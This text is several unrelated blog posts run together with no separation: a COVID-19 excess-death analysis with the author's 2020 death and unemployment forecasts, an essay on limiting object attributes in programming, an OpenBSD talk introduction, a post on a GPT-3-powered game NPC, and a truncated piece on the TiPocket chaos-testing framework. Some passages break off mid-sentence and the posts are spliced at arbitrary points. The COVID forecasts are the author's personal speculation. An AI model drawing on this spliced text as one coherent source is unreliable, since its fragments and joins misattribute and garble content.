<p>It is difficult mid-pandemic with a lack of testing to determine the case <a href="https://newslit.org/updates/case-fatality-rate-vs-mortality-rate/" target="_blank" rel="noopener noreferrer">fatality rate (CFR) or mortality rate</a>, which is typically what is being reported. Unfortunately, we don’t know the infection rate. With that in mind, it’s probably more accurate to track the “increased risk of dying in 2020”.</p>
<p>In other words:</p>
<blockquote><p>How much greater are my risks of dying in 2020 over 2019?</p></blockquote>
<p>Infection rate is included as part of metric, we don’t know the extent. COVID19 penetration is <em>maybe</em> 10% across the U.S. population (studies vary wildly). Regardless, as the year progresses, we are sure this number will increase.</p>
<p>With that in mind, on average all age groups over 25, are seeing roughly 10-15% increased risk of dying in 2020 over 2019 (again, this will likely increase):<a href="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png" alt="" width="750" height="497" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 750px) 100vw, 750px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-2048x1357.png 2048w"></a>Focusing on <strong>New York</strong>, which appears to have kept decent records &amp; has a decent infection rate – the data looks stark:</p>

<p>In contrast, <strong>Illinois </strong>is seeing less deaths over the norm, particularly in the older age groups :<a href="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png" alt="" width="750" height="497" srcset="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 750px) 100vw, 750px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-2048x1357.png 2048w"></a>The difference in Illinois appears to be older populations have seen a muted increase in deaths.

<p>It should be noted, <strong>Texas</strong> on the other hand has seen a muted increase in fatalities in all age groups (less than Illinois or New York):<a href="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png" alt="" width="792" height="524" srcset="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-2048x1357.png 2048w"></a>The largest increase has been in the 25-44 year old age range. It’s probably Texas hasn’t had as much of a proliferation of COVID19 yet and most of the spread has been related to young gathers. Leading to our next section…</p>
<h2><span>COVID19 Spread due to Gatherings</span></h2>
<p>It’s important to acknowledge, that as people gather Coronavirus spreads more easily. Particularly, in <strong>Texas</strong>, <strong>Florida</strong>, <strong>Illinois</strong> and others started to see a rise in fatalities (and infections) following rises in heat (pushing gatherings in doors), protests, and generally opening bars.</p>
<p>Particularly, the rise of deaths in <strong>Texas</strong> coincide directly with the protests (Starting week 22 and rising to the present):</p>

<p><strong>Florida</strong> has seen the same effect, in the exact same time range:</p>

Personally, I suspect heat is the largest factor. People gathered outside to protest or celebrate (July 4th) and ended up congregating inside, without masks. This lead to an increase in spread and fatalities, as moving indoors confines people together, in air conditioning, with minimal mask protection or UV to kill the virus.</p>

<p>Finally, in prior discussions I’ve made predictions. Largely, these predictions came from running simulations (both on my own and available to me). As it stands, I continue to stand by my prior prediction:</p>
<ul>
<li>3 million COVID-19 deaths in the United States is likely (April 1, 2021)</li>
<li>25% [true] unemployment in the United States is likely</li>
<li>15% reduction in GDP is within reason</li>
</ul>
<p>Rerunning prior simulation(s) with some minor adjustments to account for new information (such as mask use) and assuming moderately widespread school reopening(s) (and assuming children spread COVID19).

<p>That’s an estimated 180k to 1.85m dead by October 14th. Personally, for the officially count, I’d err on the side of the lower values, perhaps 250k. However, I suspect deaths will be under counted due to lack of testing, I suspect the real figures will be closer to 500k-800k after analysis, this would more closely matching the findings above (which indicate we are already over 200k).</p>

<p>There are still plenty of unknowns related to COVID19. Only time will tell, but we can see most people “checking out” so to speak. It’s important to keep up to date regarding COVID19 (and politics) in general. A disaster is …</p></div></article></div>

	<p><strong>Video</strong>: <a href="https://youtu.be/D8Pb8TvYsCE">Philip reading this essay</a>.</p>
<p>The 1956 paper <em><a href="http://psychclassics.yorku.ca/Miller/">The Magical Number Seven, Plus or Minus
Two</a></em> is the most widely cited paper
in the 126 year history of the journal <em><a href="https://en.wikipedia.org/wiki/Psychological_Review">Psychological
Review</a></em>. The author
<a href="https://en.wikipedia.org/wiki/George_Armitage_Miller">George A. Miller</a> is
considered one of the founders in the field of cognitive science. His
historic claim is that you can only juggle <strong>between 5 and 9 things</strong> in
your brain at any one time.</p>
<p>To my knowledge, despite some
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4486516/">controversy</a> over
the years, this 7 ± 2 figure has withstood the ongoing
<a href="https://www.nature.com/news/1-500-scientists-lift-the-lid-on-reproducibility-1.19970">reproducibility
crisis</a>
and it appears to capture a deep truth about how our brains actually
function.</p>
<p>Many people are skeptical of the claim because seven sounds like an
absurdly small number, surely if you are doing something complex like
writing software, or planning a wedding for that matter, you are juggling
dozens to hundreds of things? As it turns out you are not. At least not at
once.</p>

<p>In 2005 <strong>Lu Chao</strong> recited <a href="https://www.livescience.com/50134-pi-day-memory-experts.html">67,890
digits</a> of
Pi, a mind-boggling demonstration of a gifted and well-trained mind. Yet
given a series of random single-digit numbers he can on average recall less
the than nine of them, to be exact he’s been measured to have a <a href="https://en.wikipedia.org/wiki/Memory_span#Digit-span">digit

fits perfectly within Miller’s finding. Amazing!</p>
<p>Chao memorizes Pi the same way story tellers once memorized long tales
about <a href="https://en.wikipedia.org/wiki/Gilgamesh">Gilgamesh</a>, yet he can only
juggle a handful of things at one time. I find this actually to be very
comforting, he is not a freak of nature, at least not as freaky as you
first thought.</p>
<p>The illusion we can hold many things in mind is almost identical to the
illusion that our field of view is high resolution everywhere. It’s
incredibly compelling because the instant we wonder <em>what’s over there</em> we
do a quick <a href="https://en.wikipedia.org/wiki/Saccade">saccade</a> and are
immediately rewarded with a high resolution view of exactly <em>what’s over
there</em>. We ask the question and we get an instant answer, so it feels like
the answer was there the whole time.</p>

<p>Thinking in general works very much like vision. This is not surprising
since it’s implemented using the same brain hardware. As we rapidly flit
from idea to idea, from concept to concept, we page in the necessary
details, but at no time do we have more than about nine individual things
in the front of our minds.</p>
<p>How do we navigate a complex world with this seemingly crippling limit on
the size of our working memory? Two of the primary tools that we use are
<a href="https://en.wikipedia.org/wiki/Chunking_(psychology)">chunking</a> and
<a href="https://en.wikipedia.org/wiki/Hierarchy">hierarchy</a>.</p>
<p>When we think of a car we naturally divide the car into a handful of high
level chunks like the <em>engine</em>, the <em>dashboard</em>, the <em>seats</em>, the <em>wheels</em>.
When we mentally zoom into the engine, however, it effortlessly resolves
into more parts: the <em>engine block</em>, the <em>pistons</em>, the <em>spark plugs</em>. And
we can keep zooming in, although how far we can zoom in highly depends on
how much we know about cars and the world in general.</p>
<p>In <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">Object Oriented
Programming</a> one
of the simplest ways to tame complexity is to limit your objects to around
seven <em>attributes</em>. In some languages attributes are called <em>member
variables</em> or <em>fields</em>. Many programmers immediately balk at this
suggestion. Sure, that works for toy examples, but I’m writing serious
software and my objects sometimes need 10, 20 or 50 attributes. You must be
working on easy stuff, they will say. My problems are special, so my code
has to be different.</p>
<p>The biggest trap of software development is that it’s easy, trivial in
fact, to write software that you yourself cannot understand, and in turn no
one else can understand. Even a novice, <em>especially</em> a novice, can in a few
weeks write software that literally no one on the planet can easily think
or reason about. That’s depressing, but also kind of impressive in a way.
With great power comes great responsibility.</p>
<p>Objects which have too many attributes are a major cause of software that’s
too complicated to understand. Some people conclude the problem is Object
Oriented Programming itself. This is not a crazy idea, there are <a href="https://tobeva.com/resources/technical/programming/functional/">other
ways</a> to program, and they do
have advantages, but in my experience most of the flaws attributed to
Object Oriented Programming stem from having done it poorly, and boy is it
easy to do poorly.</p>







<div>
	<p><img src="https://tobeva.com/articles/brain-oriented-programming/complex_hua73d922edef0eeb6c3d75f190e4c0729_39455_350x0_resize_q75_catmullrom.jpg" width="350" height="197"></p><p>
Complexity grows without bound.
</p>
	
</div>
<p>The key thing to realize is a single object with a lot of attributes is
itself <em>not</em> Object Oriented. Instead, it’s a 1970s style <a href="https://en.wikipedia.org/wiki/Structured_programming">Structured
Program</a> in disguise.
The attributes of the object are the <strong>global variables</strong> of the program,
and the object’s methods are the program’s <strong>functions</strong>. Every function
can freely access every global variable which is what causes many of the
problems.</p>
<p>A structured program with more than seven global variables is trouble, and
if many objects in your program are effectively messy structured programs
themselves, you are in serious trouble indeed. At a high level you are
doing Object Oriented Programming, but at a low level you are right back in
the 1970s struggling to deal with one confusing program after the next.</p>
<p>How do we save this sinking ship? We save it by actively and aggressively
keeping the number of attributes per object <strong>at or below seven</strong>. If you
fail to do this you are punting the problem <em>to your future self</em>, a
problem that by definition your future self is going to have a hard time
solving.</p>
<p>Just today I had a <a href="https://www.python.org/">Python</a> class called
<code>PerfEvent</code> with these attributes:</p>
<div><pre><code data-lang="python">        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>
        <span>self</span><span>.</span><span>start_ns</span> <span>=</span> <span>start_ns</span>
        <span>self</span><span>.</span><span>end_ns</span> <span>=</span> <span>end_ns</span>
        <span>self</span><span>.</span><span>category</span> <span>=</span> <span>category</span>
        <span>self</span><span>.</span><span>process_id</span> <span>=</span> <span>process_id</span>
        <span>self</span><span>.</span><span>thread_id</span> <span>=</span> <span>thread_id</span>
        <span>self</span><span>.</span><span>args</span> <span>=</span> <span>kwargs</span>
        <span>self</span><span>.</span><span>phase</span> <span>=</span> <span>phase</span></code></pre></div>
<p>That’s eight attributes, since eight is only one over the limit, should we
wait until the object grows bigger? No, let’s deal with it <em>now</em>. To reduce
the number of attributes we introduce two new classes or structs: <code>Span</code>
and <code>Origin</code>. Each only has two attributes, but now the original object has
been slimmed down to six attributes, all is well again:</p>
<div><pre><code data-lang="python">        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>
        <span>self</span><span>.</span><span>span</span> <span>=</span> <span>Span</span><span>(</span><span>start_ns</span><span>,</span> <span>end_ns</span><span>)</span>
        <span>self</span><span>.</span><span>category</span> <span>=</span> <span>category</span>
        <span>self</span><span>.</span><span>origin</span> <span>=</span> <span>Origin</span><span>(</span><span>process_id</span><span>,</span> <span>thread_id</span><span>)</span>
        <span>self</span><span>.</span><span>args</span> <span>=</span> <span>kwargs</span>
        <span>self</span><span>.</span><span>phase</span> <span>=</span> <span>phase</span></code></pre></div>
<p>Although it’s a minor change, compare the two versions, the improved one
simply <em>looks</em> better, even if you stand far back and squint.</p>
<p>It seems minor, but if you don’t make these types of changes as you go it
will eventually lead to <em>intractable</em> complexity, the type of complexity
that causes projects and companies to fail, the type of complexity that
seduces humans into wasting <a href="https://spectrum.ieee.org/computing/software/why-software-fails">billions of
dollars</a>
every year writing software that does not work.</p>
<p>The benefits of introducing sub-objects goes far beyond just reducing the
number of attributes. While accessing the attributes is slightly more
verbose, I like the sound of <code>self.span.start_ns</code> compared to just
<code>self.start_ns</code>, but more importantly we can now pass <code>Span</code>'s and
<code>Owner</code>'s to functions, slimming down and chunking <em>their</em> argument lists.</p>
<p>We’ve introduced two natural and useful concepts that will pay ongoing
dividends, but even better don’t just think of how your code is today,
think about how it’s going to grow over time. Your single monolithic object
has sprouted two buds. You can now push functionality down into these buds,
and they can grow into branches, which later can sprout buds of their own.</p>
<p>For example we can now give <code>Span</code> a <code>get_duration_ns()</code> method. Again it seems
minor, but writing <code>span.get_duration_ns()</code> is better than writing
<code>span.end_ns - span.start_ns</code> especially if you are going to do that in
many different places.</p>
<p>The real magic though is that the benefits of being disciplined will accrue
like <a href="https://youtu.be/GtaoP0skPWc">compound interest</a> as you convert your
monolithic object into an intricately structured tree which buds and
sprouts and branches organically. You will benefit from this better design
every minute you are working on the software, and the software will benefit
greatly from your improved mood and ability to sustain focus.</p>







<div>
	<p><img src="https://tobeva.com/articles/brain-oriented-programming/featured-tree_hu59909ef0ac042e2e36ece8869e025722_141987_512x0_resize_q75_catmullrom.jpg" width="512" height="256"></p><p> 
A carefully tended <a href="https://en.wikipedia.org/wiki/Bonsai">Bonsai</a> tree.
</p>
	
</div>
<p>Code, like most human created artifacts, can be beautiful, so there is an
aesthetic pay off here, but the real jackpot is that if you assiduously
tend and groom this tree you will create a software design that slides into
your head with minimal fuss and friction, and slides similarly into the
heads of other people.</p>
<p>It’s no accident that we find natural environments to be more soothing than
the made world, than the concrete jungle. The design of the natural world
tends to be more in harmony with how our brains think about that world.
Game recognizes game.</p>
<p>Over time, you will grow a system that you and others can <strong>understand</strong>,
<strong>maintain</strong>, <strong>debug</strong> and <strong>extend</strong>. When people look at your code years
from now, maybe even in the <a href="https://archiveprogram.github.com/">far
future</a>, they will benefit from your
diligence and hard work. And the punchline is doing all this is not hard.
In fact, it’s <em>much easier</em> to do this work than not to not do it.</p>
<p>It’s easier and more pleasant to work with something that’s well crafted
and simpatico with your thinking. It’s hard and unpleasant to constantly
wrestle with something you don’t understand. Trim, prune and shape your
objects early and often. Your brain will thank you.</p>

</p>


<p>
EDIT:
Because I've gotten a lot more requests for the video than I had
anticipated, I've uploaded the talk publicly to YouTube.
</p>
<p>
I recently gave a talk at work to help introduce OpenBSD to my
colleagues. It's a broad introduction to the fundamentals of security
in OpenBSD, as well as some basic system administration tips and
suggestions anyone coming from a Linux background might find useful.
</p>
<p>
It's roughly split up into four sections; the history of OpenBSD,
what sets it apart from other operating systems, a guided
installation, and the system administration introduction.
</p>
<p>
In the original presentation the guided installation was done
interactively with the participants installing OpenBSD in a VM on
their machines to follow along with the slides.
</p>
<p>
I've tried my best to make it as accessible as possible while still
covering the most important beats. If you find any errors please let
me know so I can correct them, my contact info is on the <a href="https://blog.lambda.cx/about/">about</a> page.
</p>
<p>
I've corrected several small issues with the slides since the
recording. I've replaced the file name <code>/etc/mygateway</code> with <code>/etc/mygate</code>,
replaced the smartquotes with regular quotes, and removed the rebound
program, to name the biggest fixes. These corrections are available at
the slides linked below.

August 14, 2020 | https://blog.writtenrealms.com/gpt3/ | <a href="https://web.archive.org/web/*/https://blog.writtenrealms.com/gpt3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>How Written Realms is using the latest generation of Artificial Intelligence to animate its fictional worlds.</p><div>
<p>We were fortunate enough to receive an invite to the <a href="https://openai.com/blog/openai-api/">OpenAI private beta</a> a few weeks ago, gaining an interface to their <a href="https://arxiv.org/abs/2005.14165">GPT-3</a> engine. Using AI for mob interactions within <a href="https://writtenrealms.com/">Written Realms</a> had been a long term goal of ours for many years, and we jumped at the opportunity to play with it.</p>
<h2 id="howtheopenaiapiworks">How the OpenAI API works</h2>
<p>The OpenAI API provides a 'completion' endpoint (also available as a Python binding) for interacting with the GPT-3 engine.</p>
<p>Given a text prompt, the API attempts to complete the pattern that you gave it. For example if you give it an input of <code>1 2 4 8</code> and request 1 token back, you will get a response of: <code>16</code>. The API understood the pattern to be a doubling function and gave the next result.</p>
<p>It's not limited to math. If you give as input <code>Barking is to dogs as meowing is to</code>, you will get as a result: <code>cats</code>.</p>
<p>Not only is GPT-3 good at reading comprehension, but it also good at tailoring its output to match the style of the input. Consider the following prompt:</p>
<pre><code>Tom went fishing all afternoon. He comes home to his wife at sunset, who asks him a question.

Question: What did you do today?
Answer:
</code></pre>
<p>The API returns <code>I went fishing.</code> </p>
<p>It is possible to get a more creative answer by providing more information in the prompt and turning up the <code>temperature</code> setting, which gives GPT-3 more of a creative license to make stuff up. For example, if after adding <code>Tom responds enthusiastically, providing many details.</code> to the prompt before the question and turning the temperature to its max value, here's how the API responded: </p>
<pre><code>I went fishing all day, and in the afternoon I fought the biggest fish that I have ever seen before. I just held on for as long as I could, because once I gave up there was no way I was getting the fish back again. I had to pull everything I could, and my catch ended up weighing 3 pounds of flounder and 4 pounds of bluegill.
</code></pre>
<p>Evidently, GPT-3 is quite proficient at making stuff up given the right temperature.</p>
<h2 id="howwereusinggpt3">How we're using GPT-3</h2>
<p>For our first foray into GPT-3, we created a Historian NPC (Non-Player Character) who is able to answer arbitrary questions about Edeus, our flagship world. All of our lore is original and it can be challenging to impart it all to the players at once. An AI able to answer the organic questions of a player in real-time seemed like a perfect use-case.</p>
<p>We already had a feature called 'Reactions' that allows NPCs to respond to something said in their room with predetermined commands. The adjustment made here was to add a <code>gpt</code> flag to the Historian which at reaction time forwards the user's input to OpenAI in order to get the response.</p>
<p>As with the fisherman above, we can use the dialog pattern, and precede it with a certain context, which explains to GPT-3 what the background is for the interactions. In this case, we gave it an excerpt from a fictional history book written by the NPC in question, and then provided a little bit of background about the NPC himself. Here is a sample interaction with him:</p>
<pre><code>You say 'hello there'
Grae the Historian says 'Greetings, traveler.'

You say 'Who are you?'
Grae the Historian says 'I am Historian Grae, a Priest of the Church of Thune.'

You say 'Where are we?'
Grae the Historian says 'You are in Bluefinch, a village in the realm of Saphrin.'

You say 'Is there anything I should be doing?'
Grae the Historian says 'You should be killing orcs.'

You say 'Why? What have the orcs ever done to us?'
Grae the Historian says 'The orcs are evil. They want to destroy us.'

You say 'Okay. Can you tell me more about our origin?'
Grae the Historian says 'Humans were created by Thune, the Allmighty God.'

You say 'Who rules this area?'
Grae the Historian says 'The King of Saphrin, Arctus Kerinin, rules this area.'

You say 'Thanks Grae! You've been very helpful'
Grae the Historian says 'You're welcome.'
</code></pre>
<p>If you want to test this out for yourself, Grae is located 3 north, 1 east of Bluefinch Square in Edeus. We're always tweaking his backstory and various settings so his outputs may (and should!) vary a bit.</p>
<h2 id="theknowledgeexclusionlimitation">The Knowledge Exclusion Limitation</h2>
<p>The main issue we've been running up against is that it's difficult to constrain the AI's knowledge to that of a fictional world. It cannot help knowing things about the real world. For example:</p>
<pre><code>You say 'When was JFK born?'
Grae the Historian says 'John Fitzgerald Kennedy was born on May 29, 1917.'
</code></pre>
<p>Ideally, the historian would not know about anything outside of Edeus. But even though we specify in the prompt's backstory that he only answers questions pertaining to his own world, that distinction is not always understood. It's difficult to exclude knowledge.</p>
<h2 id="futureimprovements">Future Improvements</h2>
<p>We plan to keep iterating and try to make the AI feel as human and authentic as possible. One issue is that currently each interaction with the NPC is its own isolated event. For example:</p>
<pre><code>You say 'What is the name of this village?'
Grae the Historian says 'This village is called Bluefinch.'

You say 'Where did it get its name from?'
Grae the Historian says 'Edeus is named after the two titans that fought in the First Age. Thune and Raeshyk.'
</code></pre>
<p>Clearly the NPC didn't connect that the second question was a follow-up from the first. This is because each time we do a call to OpenAI we append the user's query to the end of the same base prompt, making each a separate interaction. It could be improved upon by including a few of the previous back and forths when generating a new prompt, provided it was the same player.</p>
<p>There's also entirely different ways we could leverage GPT-3. For example, it could be used to generate content like room, character and item descriptions, or even dynamic quests. A text-based platform and a text-based AI share great synergy, and the possible applications of it seem endless to the imaginative.</p></div></div>]]>

Although it provides rich capabilities to simulate abnormal system conditions, it still only solves a fraction of the Chaos Engineering puzzle. Besides fault injection, a full chaos engineering application consists of hypothesizing around defined steady states, running experiments in production, validating the system via test cases, and automating the testing.</p><p>This article describes how we use <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">TiPocket</a>, an automated testing framework to build a full Chaos Engineering testing loop for TiDB, our distributed database.</p><h2>Why do we need TiPocket?</h2><p>Before we can put a distributed system like <a href="https://github.com/pingcap/tidb" target="_blank" rel="noopener noreferrer">TiDB</a> into production, we have to ensure that it is robust enough for day-to-day use. For this reason, several years ago we introduced Chaos Engineering into our testing framework. In our testing framework, we:</p><ol><li>Observe the normal metrics and develop our testing hypothesis.</li><li>Inject a list of failures into TiDB.</li><li>Run various test cases to verify TiDB in fault scenarios. </li><li>Monitor and collect test results for analysis and diagnosis.</li></ol><p>This sounds like a solid process, and we’ve used it for years. However, as TiDB evolves, the testing scale multiplies. We have multiple fault scenarios, against which dozens of test cases run in the Kubernetes testing cluster. Even with Chaos Mesh helping to inject failures, the remaining work can still be demanding—not to mention the challenge of automating the pipeline to make the testing scalable and efficient.</p><p>This is why we built TiPocket, a fully-automated testing framework based on Kubernetes and Chaos Mesh. Currently, we mainly use it to test TiDB clusters. However, because of TiPocket’s Kubernetes-friendly design and extensible interface, you can use Kubernetes’ create and delete logic to easily support other applications.</p><h2>How does it work</h2><p>Based on the above requirements, we need an automatic workflow that:</p><ul><li><a href="#injecting-chaos---chaos-mesh">Injects chaos</a></li><li><a href="#verifying-chaos-impacts-test-cases">Verifies the impact of that chaos</a></li><li><a href="#automating-the-chaos-pipeline---argo">Automates the chaos pipeline</a></li><li><a href="#visualizing-the-results-loki">Visualizes the results</a></li></ul><h3>Injecting chaos - Chaos Mesh</h3><p>Fault injection is the core chaos testing. In a distributed database, faults can happen anytime, anywhere—from node crashes, network partitions, and file system failures, to kernel panics. This is where Chaos Mesh comes in.</p><p>Currently, TiPocket supports the following types of fault injection:</p><ul><li><strong>Network</strong>: Simulates network partitions, random packet loss, disorder, duplication, or delay of links.</li><li><strong>Time skew</strong>: Simulates clock skew of the container to be tested.</li><li><strong>Kill</strong>: Kills the specified pod, either randomly in a cluster or within a component (TiDB, TiKV, or Placement Driver (PD)).</li><li><strong>I/O</strong>: Injects I/O delays in TiDB’s storage engine, TiKV,  to identify I/O related issues.</li></ul><p>With fault injection handled, we need to think about verification. How do we make sure TiDB can survive these faults?</p><h2>Verifying chaos impacts: test cases</h2><p>To validate how TiDB withstands chaos, we implemented dozens of test cases in TiPocket, combined with a variety of inspection tools. To give you an overview of how TiPocket verifies TiDB in the event of failures, consider the following test cases. These cases focus on SQL execution, transaction consistency, and transaction isolation.</p><h3>Fuzz testing: SQLsmith</h3><p><a href="https://github.com/pingcap/tipocket/tree/master/pkg/go-sqlsmith" target="_blank" rel="noopener noreferrer">SQLsmith</a> is a tool that generates random SQL queries. TiPocket creates a TiDB cluster and a MySQL instance.. The random SQL generated by SQLsmith is executed on TiDB and MySQL, and various faults are injected into the TiDB cluster to test. In the end, execution results are compared. If we detect inconsistencies, there are potential issues with our system.</p><h3>Transaction consistency testing: Bank and Porcupine</h3><p><a href="https://github.com/pingcap/tipocket/tree/master/cmd/bank" target="_blank" rel="noopener noreferrer">Bank</a> is a classical test case that simulates the transfer process in a banking system. Under snapshot isolation, all transfers must ensure that the total amount of all accounts must be consistent at every moment, even in the face of system failures. If there are inconsistencies in the total amount, there are potential issues with our system.</p><p><a href="https://github.com/anishathalye/porcupine" target="_blank" rel="noopener noreferrer">Porcupine</a> is a linearizability checker in Go built to test the correctness of distributed systems. It takes a sequential specification as executable Go code, along with a concurrent history, and it determines whether the history is linearizable with respect to the sequential specification. In TiPocket, we use the <a href="https://github.com/pingcap/tipocket/tree/master/pkg/check/porcupine" target="_blank" rel="noopener noreferrer">Porcupine</a> checker in multiple test cases to check whether TiDB meets the linearizability constraint.</p><h3>Transaction Isolation testing: Elle</h3><p><a href="https://github.com/jepsen-io/elle" target="_blank" rel="noopener noreferrer">Elle</a> is an inspection tool that verifies a database’s transaction isolation level. TiPocket integrates <a href="https://github.com/pingcap/tipocket/tree/master/pkg/elle" target="_blank" rel="noopener noreferrer">go-elle</a>, the Go implementation of the Elle inspection tool, to verify TiDB’s isolation level.</p><p>These are just a few of the test cases TiPocket uses to verify TiDB’s accuracy and stability. For more test cases and verification methods, see our <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">source code</a>.</p><h2>Automating the chaos pipeline - Argo</h2><p>Now that we have Chaos Mesh to inject faults, a TiDB cluster to test, and ways to validate TiDB, how can we automate the chaos testing pipeline? Two options come to mind: we could implement the scheduling functionality in TiPocket, or hand over the job to existing open-source tools. To make TiPocket more dedicated to the testing part of our workflow, we chose the open-source tools approach. This, plus our all-in-K8s design, lead us directly to <a href="https://github.com/argoproj/argo" target="_blank" rel="noopener noreferrer">Argo</a>.</p><p>Argo is a workflow engine designed for Kubernetes. It has been an open source product for a long time, and has received widespread attention and application.</p><p>Argo has abstracted several custom resource definitions (CRDs) for workflows.  The most important ones include Workflow Template, Workflow, and Cron Workflow. Here is how Argo fits in TiPocket:</p><ul><li><strong>Workflow Template</strong> is a template defined in advance for each test task. Parameters can be passed in when the test is running.</li><li><strong>Workflow</strong> schedules multiple workflow templates in different orders, which form the tasks to be executed. Argo also lets you add conditions, loops, and directed acyclic graphs (DAGs) in the pipeline.</li><li><strong>Cron Workflow</strong> lets you schedule a workflow like a cron job. It is perfectly suitable for scenarios where you want to run test tasks for a long time.</li></ul><p>The sample workflow for our predefined bank test is shown below:</p><div><div><div tabindex="0"><div><p><span>spec</span><span>:</span><span></span></p><p><span>  </span><span>entrypoint</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>  </span><span>arguments</span><span>:</span><span></span></p><p><span>    </span><span>parameters</span><span>:</span><span></span></p><p><span>      </span><span>-</span><span> </span><span>name</span><span>:</span><span> ns</span></p><p><span>        </span><span>value</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p><p><span>            </span><span>-</span><span> </span><span>name</span><span>:</span><span> nemesis</span></p><p><span>        </span><span>value</span><span>:</span><span> random_kill</span><span>,</span><span>kill_pd_leader_5min</span><span>,</span><span>partition_one</span><span>,</span><span>subcritical_skews</span><span>,</span><span>big_skews</span><span>,</span><span>shuffle</span><span>-</span><span>leader</span><span>-</span><span>scheduler</span><span>,</span><span>shuffle</span><span>-</span><span>region</span><span>-</span><span>scheduler</span><span>,</span><span>random</span><span>-</span><span>merge</span><span>-</span><span>scheduler</span></p><p><span>  </span><span>templates</span><span>:</span><span></span></p><p><span>    </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>      </span><span>steps</span><span>:</span><span></span></p><p><span>        </span><span>-</span><span> </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>wait</span><span>-</span><span>cluster</span></p><p><span>            </span><span>templateRef</span><span>:</span><span></span></p><p><span>              </span><span>name</span><span>:</span><span> wait</span><span>-</span><span>cluster</span></p><p><span>              </span><span>template</span><span>:</span><span> wait</span><span>-</span><span>cluster</span></p><p><span>        </span><span>-</span><span> </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>            </span><span>templateRef</span><span>:</span><span></span></p><p><span>              </span><span>name</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p><p><span>              </span><span>template</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p></div></div></div></div><p>In this example, we use the workflow template and nemesis parameters to define the specific failure to inject. You can reuse the template to define multiple workflows that suit different test cases. This allows you to add more customized 